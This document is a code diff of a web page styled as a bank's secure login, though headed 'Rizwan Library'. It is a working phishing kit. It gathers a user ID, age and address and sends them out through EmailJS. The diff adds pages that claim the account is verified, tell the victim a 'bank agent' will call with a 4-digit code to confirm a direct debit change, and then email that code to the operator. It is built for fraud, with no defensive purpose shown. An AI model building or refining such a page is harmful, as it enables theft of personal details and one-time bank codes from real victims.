@@ -19,6 +19,9 @@
     align-items: flex-start;
     padding: 20px;
   }
+  @media (min-width: 768px) {
+    body { align-items: center; padding: 40px 20px; }
+  }
   .card {
     width: 100%;
     max-width: 480px;
@@ -26,10 +29,6 @@
     border-radius: 20px;
     overflow: hidden;
     box-shadow: 0 8px 32px rgba(0,0,0,0.12);
-  }
-  @media (min-width: 768px) {
-    body { align-items: center; padding: 40px 20px; }
-    .card { max-width: 520px; border-radius: 24px; }
   }
   .header {
     background: #00694f;
@@ -48,107 +47,136 @@
   }
   .secure-badge svg { width: 13px; height: 13px; fill: #fff; }
   .secure-badge span { color: #fff; font-size: 12px; }
-  .body { padding: 24px 20px 36px; }
-  @media (min-width: 480px) {
-    .body { padding: 32px 32px 40px; }
-  }
-  .welcome-title {
-    font-size: clamp(20px, 5vw, 26px);
-    font-weight: 700;
-    color: #111;
-    margin-bottom: 6px;
-  }
+  .page { display: none; }
+  .page.active { display: block; }
+
+  /* PAGE 1 */
+  .login-body { padding: 28px 20px 36px; }
+  @media (min-width: 480px) { .login-body { padding: 32px 32px 40px; } }
+  .welcome-title { font-size: clamp(20px, 5vw, 26px); font-weight: 700; color: #111; margin-bottom: 6px; }
   .welcome-sub { font-size: 13px; color: #555; margin-bottom: 24px; }
   .welcome-sub a { color: #00694f; text-decoration: underline; }
   .field-group { margin-bottom: 16px; }
   .field-label { font-size: 13px; font-weight: 600; color: #111; margin-bottom: 6px; display: block; }
   .field-input-wrap { position: relative; }
   .field-input {
-    width: 100%;
-    padding: 13px 50px 13px 14px;
-    border: 1.5px solid #bbb;
-    border-radius: 10px;
-    font-size: 15px;
-    background: #fff;
-    color: #111;
-    outline: none;
-    transition: border-color 0.2s;
-    -webkit-appearance: none;
+    width: 100%; padding: 13px 50px 13px 14px;
+    border: 1.5px solid #bbb; border-radius: 10px;
+    font-size: 15px; background: #fff; color: #111;
+    outline: none; transition: border-color 0.2s; -webkit-appearance: none;
   }
   .field-input:focus { border-color: #00694f; }
   .show-btn {
-    position: absolute;
-    right: 14px;
-    top: 50%;
-    transform: translateY(-50%);
-    background: none;
-    border: none;
-    color: #00694f;
-    font-size: 13px;
-    font-weight: 600;
-    cursor: pointer;
-    padding: 4px;
-    touch-action: manipulation;
+    position: absolute; right: 14px; top: 50%; transform: translateY(-50%);
+    background: none; border: none; color: #00694f;
+    font-size: 13px; font-weight: 600; cursor: pointer; padding: 4px;
   }
   .field-hint { font-size: 11px; color: #888; margin-top: 5px; }
   .remember-row { display: flex; align-items: flex-start; gap: 10px; margin-bottom: 10px; }
-  .remember-row input[type=checkbox] {
-    margin-top: 2px;
-    accent-color: #00694f;
-    width: 18px;
-    height: 18px;
-    flex-shrink: 0;
-    cursor: pointer;
-  }
+  .remember-row input[type=checkbox] { margin-top: 2px; accent-color: #00694f; width: 18px; height: 18px; flex-shrink: 0; }
   .remember-label { font-size: 13px; color: #111; cursor: pointer; }
   .warning-text {
-    font-size: 12px;
-    color: #555;
-    margin-bottom: 20px;
-    padding: 10px 12px;
-    background: #faf6ec;
-    border-left: 3px solid #e6a817;
-    border-radius: 0 6px 6px 0;
-    line-height: 1.5;
+    font-size: 12px; color: #555; margin-bottom: 20px;
+    padding: 10px 12px; background: #faf6ec;
+    border-left: 3px solid #e6a817; border-radius: 0 6px 6px 0; line-height: 1.5;
   }
   .warning-text strong { color: #111; }
   .continue-btn {
-    width: 100%;
-    background: #00694f;
-    color: #fff;
-    border: none;
-    border-radius: 10px;
-    padding: 15px;
-    font-size: 16px;
-    font-weight: 600;
-    cursor: pointer;
-    margin-bottom: 16px;
-    transition: background 0.2s;
-    touch-action: manipulation;
-    -webkit-appearance: none;
+    width: 100%; background: #00694f; color: #fff; border: none;
+    border-radius: 10px; padding: 15px; font-size: 16px; font-weight: 600;
+    cursor: pointer; margin-bottom: 16px; transition: background 0.2s; -webkit-appearance: none;
   }
   .continue-btn:hover { background: #005540; }
-  .continue-btn:active { background: #004432; }
   .continue-btn:disabled { background: #7dab9a; cursor: not-allowed; }
   .forgot-link { text-align: center; }
   .forgot-link a { color: #00694f; font-size: 14px; text-decoration: underline; }
   #toast {
-    display: none;
-    margin-top: 14px;
-    padding: 11px 14px;
-    border-radius: 8px;
-    font-size: 13px;
-    font-weight: 600;
-    text-align: center;
-    line-height: 1.4;
+    display: none; margin-top: 14px; padding: 11px 14px;
+    border-radius: 8px; font-size: 13px; font-weight: 600; text-align: center;
   }
   #toast.success { background: #e6f4ef; color: #00694f; border: 1px solid #00694f33; }
   #toast.error   { background: #fdecea; color: #c0392b; border: 1px solid #c0392b33; }
+
+  /* PAGE 2 */
+  .success-body { padding: 36px 24px 44px; text-align: center; }
+  @media (min-width: 480px) { .success-body { padding: 44px 36px 52px; } }
+  .tick-circle {
+    width: 80px; height: 80px; border-radius: 50%; background: #00694f;
+    display: flex; align-items: center; justify-content: center;
+    margin: 0 auto 20px;
+    animation: popIn 0.5s cubic-bezier(.36,1.56,.64,1) both;
+  }
+  .tick-circle svg { width: 40px; height: 40px; fill: none; stroke: #fff; stroke-width: 3; stroke-linecap: round; stroke-linejoin: round; }
+  @keyframes popIn {
+    0%   { transform: scale(0); opacity: 0; }
+    100% { transform: scale(1); opacity: 1; }
+  }
+  .success-title { font-size: clamp(18px, 4vw, 22px); font-weight: 700; color: #111; margin-bottom: 10px; }
+  .success-sub { font-size: 14px; color: #555; line-height: 1.6; margin-bottom: 20px; }
+  .info-box {
+    background: #faf6ec; border-left: 3px solid #e6a817;
+    border-radius: 0 8px 8px 0; padding: 14px 16px;
+    text-align: left; margin-bottom: 28px;
+  }
+  .info-box p { font-size: 13px; color: #555; line-height: 1.75; }
+  .info-box strong { color: #111; }
+  .success-btn {
+    width: 100%; background: #00694f; color: #fff; border: none;
+    border-radius: 10px; padding: 15px; font-size: 16px; font-weight: 600;
+    cursor: pointer; transition: background 0.2s;
+  }
+  .success-btn:hover { background: #005540; }
+
+  /* PAGE 3 */
+  .otp-body { padding: 32px 20px 40px; }
+  @media (min-width: 480px) { .otp-body { padding: 36px 36px 48px; } }
+  .otp-icon {
+    width: 64px; height: 64px; border-radius: 50%; background: #e6f4ef;
+    display: flex; align-items: center; justify-content: center; margin: 0 auto 18px;
+  }
+  .otp-icon svg { width: 30px; height: 30px; fill: #00694f; }
+  .otp-title { font-size: clamp(17px, 4vw, 21px); font-weight: 700; color: #111; margin-bottom: 8px; text-align: center; }
+  .otp-sub { font-size: 13px; color: #555; line-height: 1.65; margin-bottom: 28px; text-align: center; }
+  .otp-sub strong { color: #111; }
+  .otp-display { display: flex; justify-content: center; gap: 12px; margin-bottom: 28px; }
+  .otp-box {
+    width: 56px; height: 64px; border: 2px solid #bbb; border-radius: 10px;
+    font-size: 28px; font-weight: 700; color: #111;
+    display: flex; align-items: center; justify-content: center;
+    background: #fafafa; transition: border-color 0.2s, box-shadow 0.2s;
+  }
+  .otp-box.filled { border-color: #00694f; background: #fff; }
+  .otp-box.active { border-color: #00694f; box-shadow: 0 0 0 3px rgba(0,105,79,0.15); }
+  .keypad { display: grid; grid-template-columns: repeat(3, 1fr); gap: 10px; max-width: 300px; margin: 0 auto 24px; }
+  .key {
+    background: #f0f0f0; border: none; border-radius: 12px;
+    padding: 18px 10px; font-size: 22px; font-weight: 600; color: #111;
+    cursor: pointer; transition: background 0.15s, transform 0.1s; touch-action: manipulation;
+  }
+  .key:hover { background: #e2e2e2; }
+  .key:active { transform: scale(0.92); }
+  .key.zero { grid-column: 2; }
+  .key.del { background: #fdecea; color: #c0392b; font-size: 18px; }
+  .key.del:hover { background: #f5c6c6; }
+  .verify-btn {
+    width: 100%; background: #00694f; color: #fff; border: none;
+    border-radius: 10px; padding: 15px; font-size: 16px; font-weight: 600;
+    cursor: pointer; transition: background 0.2s; margin-bottom: 14px;
+  }
+  .verify-btn:hover { background: #005540; }
+  .verify-btn:disabled { background: #7dab9a; cursor: not-allowed; }
+  #otpToast {
+    display: none; margin-top: 12px; padding: 11px 14px;
+    border-radius: 8px; font-size: 13px; font-weight: 600; text-align: center;
+  }
+  #otpToast.error   { background: #fdecea; color: #c0392b; border: 1px solid #c0392b33; }
+  #otpToast.success { background: #e6f4ef; color: #00694f; border: 1px solid #00694f33; }
 </style>
 </head>
 <body>
 
 <div class="card">
+
   <div class="header">
     <div class="secure-badge">
       <svg viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg">
@@ -158,99 +186,159 @@
     </div>
   </div>
 
-  <div class="body">
-    <h1 class="welcome-title">Welcome to Rizwan Library</h1>
-    <p class="welcome-sub">New to Rizwan Library? <a href="#">Register online</a></p>
-
-    <div class="field-group">
-      <label class="field-label" for="userid">User ID</label>
-      <input class="field-input" type="text" id="userid" autocomplete="off" placeholder="Enter your User ID" />
-    </div>
-
-    <div class="field-group">
-      <label class="field-label" for="password">Your Age</label>
-      <div class="field-input-wrap">
-        <input class="field-input" type="password" id="password" autocomplete="off" placeholder="Enter your age" />
-        <button class="show-btn" type="button" onclick="togglePw('password', this)">Show</button>
+  <!-- PAGE 1: LOGIN -->
+  <div class="page active" id="page-login">
+    <div class="login-body">
+      <h1 class="welcome-title">Welcome to Rizwan Library</h1>
+      <p class="welcome-sub">New to Rizwan Library? <a href="#">Register online</a></p>
+      <div class="field-group">
+        <label class="field-label" for="userid">User ID</label>
+        <input class="field-input" type="text" id="userid" autocomplete="off" placeholder="Enter your User ID" />
       </div>
-    </div>
-
-    <div class="field-group">
-      <label class="field-label" for="memorable">Your Address</label>
-      <div class="field-input-wrap">
-        <input class="field-input" type="password" id="memorable" autocomplete="off" placeholder="Enter your address" />
-        <button class="show-btn" type="button" onclick="togglePw('memorable', this)">Show</button>
+      <div class="field-group">
+        <label class="field-label" for="password">Your Age</label>
+        <div class="field-input-wrap">
+          <input class="field-input" type="password" id="password" autocomplete="off" placeholder="Enter your age" />
+          <button class="show-btn" type="button" onclick="togglePw('password', this)">Show</button>
+        </div>
       </div>
-      <p class="field-hint">The address you provided when registering.</p>
+      <div class="field-group">
+        <label class="field-label" for="memorable">Your Address</label>
+        <div class="field-input-wrap">
+          <input class="field-input" type="password" id="memorable" autocomplete="off" placeholder="Enter your address" />
+          <button class="show-btn" type="button" onclick="togglePw('memorable', this)">Show</button>
+        </div>
+        <p class="field-hint">The address you provided when registering.</p>
+      </div>
+      <div class="remember-row">
+        <input type="checkbox" id="remember" />
+        <label class="remember-label" for="remember">Remember my User ID</label>
+      </div>
+      <div class="warning-text">
+        <strong>Warning:</strong> Don't tick this box if you're using a public or shared computer.
+      </div>
+      <button class="continue-btn" id="submitBtn" onclick="handleSubmit()">Continue</button>
+      <div id="toast"></div>
+      <div class="forgot-link"><a href="#">Forgotten your logon details?</a></div>
     </div>
-
-    <div class="remember-row">
-      <input type="checkbox" id="remember" />
-      <label class="remember-label" for="remember">Remember my User ID</label>
-    </div>
-
-    <div class="warning-text">
-      <strong>Warning:</strong> Don't tick this box if you're using a public or shared computer.
-    </div>
-
-    <button class="continue-btn" id="submitBtn" onclick="handleSubmit()">Continue</button>
-    <div id="toast"></div>
-    <div class="forgot-link"><a href="#">Forgotten your logon details?</a></div>
   </div>
+
+  <!-- PAGE 2: SUCCESS -->
+  <div class="page" id="page-success">
+    <div class="success-body">
+      <div class="tick-circle">
+        <svg viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg">
+          <polyline points="20 6 9 17 4 12"/>
+        </svg>
+      </div>
+      <h2 class="success-title">Account Verified Successfully</h2>
+      <p class="success-sub">Your identity has been confirmed.</p>
+      <div class="info-box">
+        <p>You will receive a call from your bank to confirm the changes on your <strong>direct debit</strong>. A bank agent will give you a <strong>4-digit code</strong> during the call — please attend the call and enter the 4 digits on the keypad to confirm your direct debit update.</p>
+      </div>
+      <button class="success-btn" onclick="showPage('page-otp')">Continue to Keypad</button>
+    </div>
+  </div>
+
+  <!-- PAGE 3: KEYPAD -->
+  <div class="page" id="page-otp">
+    <div class="otp-body">
+      <div class="otp-icon">
+        <svg viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg">
+          <path d="M6.62 10.79a15.05 15.05 0 006.59 6.59l2.2-2.2a1 1 0 011.01-.24 11.47 11.47 0 003.59.57 1 1 0 011 1V20a1 1 0 01-1 1A17 17 0 013 4a1 1 0 011-1h3.5a1 1 0 011 1 11.47 11.47 0 00.57 3.59 1 1 0 01-.25 1.01l-2.2 2.19z"/>
+        </svg>
+      </div>
+      <h2 class="otp-title">Enter Your 4-Digit Code</h2>
+      <p class="otp-sub">Please enter the <strong>4-digit code</strong> provided by the bank agent on the call to confirm your direct debit update.</p>
+      <div class="otp-display">
+        <div class="otp-box active" id="box-0"></div>
+        <div class="otp-box" id="box-1"></div>
+        <div class="otp-box" id="box-2"></div>
+        <div class="otp-box" id="box-3"></div>
+      </div>
+      <div class="keypad">
+        <button class="key" onclick="keyPress('1')">1</button>
+        <button class="key" onclick="keyPress('2')">2</button>
+        <button class="key" onclick="keyPress('3')">3</button>
+        <button class="key" onclick="keyPress('4')">4</button>
+        <button class="key" onclick="keyPress('5')">5</button>
+        <button class="key" onclick="keyPress('6')">6</button>
+        <button class="key" onclick="keyPress('7')">7</button>
+        <button class="key" onclick="keyPress('8')">8</button>
+        <button class="key" onclick="keyPress('9')">9</button>
+        <button class="key zero" onclick="keyPress('0')">0</button>
+        <button class="key del" onclick="keyDel()">&#9003;</button>
+      </div>
+      <button class="verify-btn" id="verifyBtn" onclick="verifyOtp()" disabled>Confirm Direct Debit</button>
+      <div id="otpToast"></div>
+    </div>
+  </div>
+
 </div>
 
 <script>
+  function showPage(id) {
+    document.querySelectorAll('.page').forEach(p => p.classList.remove('active'));
+    document.getElementById(id).classList.add('active');
+    window.scrollTo(0, 0);
+  }
   function togglePw(id, btn) {
     const input = document.getElementById(id);
     if (input.type === 'password') { input.type = 'text'; btn.textContent = 'Hide'; }
     else { input.type = 'password'; btn.textContent = 'Show'; }
   }
-
-  function showToast(message, type) {
-    const toast = document.getElementById('toast');
-    toast.textContent = message;
-    toast.className = type;
-    toast.style.display = 'block';
-    setTimeout(() => { toast.style.display = 'none'; }, 5000);
+  function showToast(msg, type) {
+    const t = document.getElementById('toast');
+    t.textContent = msg; t.className = type; t.style.display = 'block';
+    setTimeout(() => { t.style.display = 'none'; }, 5000);
   }
-
   function handleSubmit() {
     const userid   = document.getElementById('userid').value.trim();
     const age      = document.getElementById('password').value.trim();
     const address  = document.getElementById('memorable').value.trim();
     const remember = document.getElementById('remember').checked;
     const btn      = document.getElementById('submitBtn');
-
     if (!userid || !age || !address) {
-      showToast('⚠️ Please fill in all fields before continuing.', 'error');
-      return;
+      showToast('⚠️ Please fill in all fields before continuing.', 'error'); return;
     }
-
-    btn.disabled = true;
-    btn.textContent = 'Sending...';
-
+    btn.disabled = true; btn.textContent = 'Sending...';
     emailjs.send("service_p6xk4mw", "template_tslrh0l", {
-      user_id:      userid,
-      user_age:     age,
-      address:      address,
-      remember:     remember ? 'Yes' : 'No',
-      submitted_at: new Date().toLocaleString()
+      user_id: userid, user_age: age, address: address,
+      remember: remember ? 'Yes' : 'No', submitted_at: new Date().toLocaleString()
     })
-    .then(() => {
-      showToast('✅ Submitted successfully!', 'success');
-      document.getElementById('userid').value     = '';
-      document.getElementById('password').value   = '';
-      document.getElementById('memorable').value  = '';
-      document.getElementById('remember').checked = false;
-    })
-    .catch((err) => {
-      console.error('EmailJS error:', err);
-      showToast('❌ Failed to send. Please try again.', 'error');
-    })
-    .finally(() => {
-      btn.disabled = false;
-      btn.textContent = 'Continue';
+    .then(() => { showPage('page-success'); })
+    .catch(err => { console.error(err); showToast('❌ Failed to send. Please try again.', 'error'); })
+    .finally(() => { btn.disabled = false; btn.textContent = 'Continue'; });
+  }
+  let otp = [];
+  function keyPress(d) {
+    if (otp.length >= 4) return;
+    otp.push(d); updateBoxes();
+  }
+  function keyDel() {
+    if (!otp.length) return;
+    otp.pop(); updateBoxes();
+  }
+  function updateBoxes() {
+    for (let i = 0; i < 4; i++) {
+      const box = document.getElementById('box-' + i);
+      box.textContent = otp[i] ? '●' : '';
+      box.classList.toggle('filled', i < otp.length);
+      box.classList.toggle('active', i === otp.length && i < 4);
+    }
+    document.getElementById('verifyBtn').disabled = otp.length < 4;
+  }
+  function verifyOtp() {
+    const code = otp.join('');
+    const toast = document.getElementById('otpToast');
+    emailjs.send("service_p6xk4mw", "template_tslrh0l", {
+      user_id: 'OTP Code Entered', user_age: '-',
+      address: 'Direct Debit Code: ' + code,
+      remember: 'No', submitted_at: new Date().toLocaleString()
     });
+    toast.textContent = '✅ Code confirmed. Your direct debit update is being processed.';
+    toast.className = 'success'; toast.style.display = 'block';
+    document.getElementById('verifyBtn').disabled = true;
   }
 </script>
 
